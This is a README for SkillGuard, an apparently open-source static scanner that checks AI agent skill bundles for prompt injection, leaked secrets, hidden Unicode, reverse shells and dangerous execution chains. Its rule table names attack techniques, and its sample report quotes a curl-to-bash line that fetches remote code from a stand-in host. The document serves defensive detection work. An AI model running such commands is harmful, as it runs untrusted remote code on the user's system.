<div align="center">

<img src="assets/skillguard-showcase.svg" alt="Animated SkillGuard security pipeline: inspect AI agent skill bundles without executing them" width="100%">

# SkillGuard

### Security scanner for AI agent skills — not just a Markdown linter.

**Inspect the entire skill bundle. Find risky instructions, secrets, hidden characters, reverse shells and dangerous execution chains — before an agent uses them.**

[![License: MIT](https://img.shields.io/badge/license-MIT-65d6b4?style=for-the-badge)](LICENSE)
[![Node.js](https://img.shields.io/badge/Node.js-18%2B-339933?style=for-the-badge&logo=node.js&logoColor=white)](https://nodejs.org/)
[![Zero dependencies](https://img.shields.io/badge/runtime%20dependencies-0-4f9bdb?style=for-the-badge)](package.json)
[![CI](https://img.shields.io/github/actions/workflow/status/Khayom1/SkillGuard/ci.yml?branch=main&style=for-the-badge&label=CI)](.github/workflows/ci.yml)
[![Version](https://img.shields.io/badge/version-0.2.0-blue?style=for-the-badge)](CHANGELOG.md)

**Offline · Explainable · CI-ready · No API key · Never executes scanned scripts**

[Quick start](#quick-start) · [Detection rules](#detection-coverage) · [GitHub Action](#github-action) · [Integrity lock](#integrity-lock) · [Threat model](docs/THREAT_MODEL.md)

</div>

---

## The problem

An AI agent skill is not just a `SKILL.md` file. It can bundle shell scripts, helper code, references, configuration and instructions that influence an agent with access to tools and data.

A dangerous command can hide in an installer. A prompt-injection instruction can be embedded in a reference file. A credential can be committed accidentally. Invisible Unicode can make text look different from what an agent actually reads.

**SkillGuard inspects the bundle, not just the headline file.**

## How it works

1. **Discover** — walk the selected skill directory within configured file, byte, directory and depth limits.
2. **Inspect safely** — read supported text and code files; inspect selected encoded representations with bounded decoding.
3. **Evaluate rules** — apply transparent pattern-based checks for risky instructions, secrets, execution chains, persistence and permissions.
4. **Explain** — report rule ID, severity, file, line and a concise reason.
5. **Integrate** — emit terminal, JSON or SARIF output; use the GitHub Action to enforce a severity threshold.
6. **Verify integrity** — create a SHA-256 lock and detect later additions, modifications or missing files.

> **Safety boundary:** SkillGuard does not execute scanned scripts, install dependencies, call external services or submit your files to an AI API.

## Detection coverage

SkillGuard currently includes **17 rule families**.

| Rule | Severity | Detection |
|---|---|---|
| SG001 | High | Zero-width, bidirectional and unexpected control characters |
| SG002 | Medium | Missing or invalid Agent Skills frontmatter fields |
| SG003 | High | Instruction overrides and jailbreak-style role changes |
| SG004 | High | Requests to reveal private prompts, tokens or environment secrets |
| SG005 | Critical | Provider credentials, API tokens and private-key patterns |
| SG006 | Critical | Remote download piped into a shell, interpreter or PowerShell IEX |
| SG007 | Critical | Destructive disk and recursive-delete commands |
| SG008 | High | Startup, service, scheduled-task and autorun persistence |
| SG009 | High | References to credential stores and private-key locations |
| SG010 | High | Encoded content passed to dynamic code execution |
| SG011 | Critical | Secret access combined with network transfer |
| SG012 | Medium | Broad privilege requests and unsafe filesystem permissions |
| SG013 | High | Encoded payloads that decode to recognizable risky behavior |
| SG014 | Medium | Frontmatter pre-authorizing shell or command tools |
| SG015 | Medium | Agent lifecycle hooks paired with automatic commands |
| SG016 | Critical | Reverse shells, netcat listeners, remote interactive access |
| SG017 | High | `eval`/`exec`, Python `shell=True`, PowerShell `Invoke-Expression` |

Full details and examples: [Detection rules](docs/rules.md).

### Scoring

The score starts at 100 and subtracts 35 points per critical finding, 20 per high, 9 per medium and 3 per low finding. It is clamped to 0–100.

The score is a prioritization aid — **not** a probability that a skill is safe and not a security certification.

## Quick start

**Requirements:** Node.js 18 or newer.

```bash
git clone https://github.com/Khayom1/SkillGuard.git
cd SkillGuard
npm install -g .
```

Scan a skill:

```bash
skillguard ./my-skill
```

Scan a collection:

```bash
skillguard ./skills
```

Generate machine-readable output:

```bash
skillguard ./skills --format json --output report.json
skillguard ./skills --format sarif --output skillguard.sarif
```

Pin and verify the exact reviewed bundle:

```bash
skillguard lock ./my-skill
skillguard verify ./my-skill
```

No API key. No runtime dependencies. No network access required for scanning.

**Package status:** npm package `skillguard-ai` is prepared for publish (v0.2.0). Until the public registry release is live, install from this repository as shown above.

## Example output

The following is an illustrative report, not a scan result from a real third-party skill.

```text
SkillGuard Security audit
25/100  Grade F  ·  4 files  ·  3 findings
Critical 1  High 2  Medium 0  Low 0

CRITICAL SG006 scripts/setup.sh:12
  Downloads remote content and immediately pipes it to a shell.
  curl https://example.invalid/install.sh | bash

HIGH SG003 SKILL.md:18
  Prompt-injection style instruction override detected.

HIGH SG001 SKILL.md:24
  Hidden or control character detected (U+202E).
```

Every finding is designed to be reviewable: rule identifier, severity, file location and explanation.

## GitHub Action

Add SkillGuard to a workflow to scan skill bundles on pull requests and pushes.

```yaml
name: Skill security

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: Khayom1/SkillGuard@main
        with:
          path: ./skills
          fail-on: high
```

### Inputs

| Input | Default | Purpose |
|---|---|---|
| `path` | `.` | Skill directory or file to scan |
| `fail-on` | `high` | Severity threshold: critical, high, medium, low or none |
| `upload-sarif` | `false` | Upload generated SARIF to GitHub Code Scanning |
| `sarif-file` | `skillguard.sarif` | SARIF output path |

For Code Scanning upload, grant `security-events: write` and set `upload-sarif: 'true'`. See the [complete GitHub Action guide](docs/github-action.md).

## Integrity lock

A security scan describes what the current files look like. An integrity lock helps answer a different question:

**Is this still the exact bundle that was reviewed?**

```bash
skillguard lock ./my-skill
skillguard verify ./my-skill
```

The lock records SHA-256 hashes and permission-mode snapshots for regular files within configured limits. Verification reports changed, added and missing files.

- Symlinks are not followed.
- Lock creation stops if a filesystem item cannot be safely included.
- The `.git` metadata directory is excluded.
- Commit the generated `.skillguard.lock.json` beside the skill or preserve it in your release process.

Run `verify` before installation or deployment.

## CLI reference

| Option | Default | Description |
|---|---|---|
| `--format text\|json\|sarif` | `text` | Report format |
| `--output FILE` | stdout | Write report to a file |
| `--fail-on LEVEL` | `high` | Exit non-zero at or above severity |
| `--max-files N` | `5000` | Maximum files inspected |
| `--max-file-bytes N` | `1048576` | Maximum bytes per file |
| `--max-directories N` | `10000` | Maximum directories visited |
| `--max-depth N` | `40` | Maximum traversal depth |
| `--allow-skipped` | off | Allow success when discovered items were skipped |
| `--no-color` | off | Disable terminal colors |

### Exit codes

| Code | Meaning |
|---|---|
| `0` | Complete scan below the selected threshold |
| `1` | Finding at or above the selected threshold |
| `2` | Invalid arguments, scan/report error or incomplete scan |

By default, skipped items make the scan incomplete and return code 2. Use `--allow-skipped` only after reviewing omissions; the report remains marked incomplete.

## Development and verification

```bash
git clone https://github.com/Khayom1/SkillGuard.git
cd SkillGuard

npm test
npm run check
npm run benchmark
npm run verify
```

Run the safe example:

```bash
node src/cli.js examples/safe-skill --format json --fail-on none
```

Inspect the intentionally risky fixture:

```bash
node src/cli.js examples/risky-skill --format text --fail-on none
```

The risky fixture is inert demonstration content. Dangerous patterns are guarded (`if false` / `if False`) and are never executed by SkillGuard.

The project uses Node's built-in test runner and has zero runtime dependencies. Benchmark methodology and cases are documented in [docs/benchmark.md](docs/benchmark.md).

## Project architecture

```text
SkillGuard/
├── src/
│   ├── cli.js          # Command-line interface
│   ├── scanner.js      # Scan orchestration
│   ├── rules.js        # Detection rules
│   ├── files.js        # File discovery and limits
│   ├── safe-fs.js      # Safe filesystem operations
│   ├── frontmatter.js  # Agent Skills metadata checks
│   ├── reporters.js    # Text, JSON and SARIF reports
│   ├── integrity.js    # SHA-256 lock and verification
│   ├── version.js      # Version metadata
│   └── index.js        # Public module exports
├── tests/              # Unit and integration tests
├── benchmarks/         # Benchmark cases
├── examples/           # Safe and intentionally risky fixtures
├── docs/               # Architecture, rules, threat model and guides
├── .github/workflows/  # CI and publishing workflows
├── action.yml          # Reusable GitHub Action
└── README.md
```

## Threat model and limitations

SkillGuard is a heuristic static analyzer. It is one layer in a defense-in-depth process — not an AI judge, sandbox, malware detector or security certification.

- Pattern matching can produce false positives and false negatives.
- Novel, multi-stage, heavily obfuscated or context-dependent attacks may evade detection.
- External URLs are not reputation-checked because scans make no network requests.
- Not every YAML feature or programming language construct is interpreted.
- Encoded inspection is bounded and covers selected representations; it does not decode arbitrary, nested, compressed or custom obfuscation.
- Unsupported file types and excluded directories are reported as skipped; inspect them separately when relevant.
- A clean scan does not prove that a skill is safe.

Review permissions, inspect findings, sandbox agents and require human approval for consequential actions.

Read the [threat model](docs/THREAT_MODEL.md), [architecture](docs/architecture.md), [rules](docs/rules.md), [roadmap](docs/ROADMAP.md), [competitive landscape](docs/competitive-landscape.md) and [release process](docs/release.md).

## Design principles

1. **Never execute untrusted content.** Read-only inspection is the boundary.
2. **Explain every alert.** Findings identify the rule, severity and source location.
3. **Keep it local.** No telemetry, API keys or external scan requests.
4. **Prefer precision.** Detect concrete risky behavior, not merely alarming words.
5. **Expose uncertainty.** Heuristics are useful signals, never guarantees.

## License

MIT. See [LICENSE](LICENSE).

---

<div align="center">

**Built by [Khayom Abdurahmonov](https://github.com/Khayom1)**

[Repository](https://github.com/Khayom1/SkillGuard) · [Issues](https://github.com/Khayom1/SkillGuard/issues) · [VEYROST ecosystem](https://veyrost.is-a.dev/)

*Inspect the skill. Understand the risk. Keep control.*

</div>
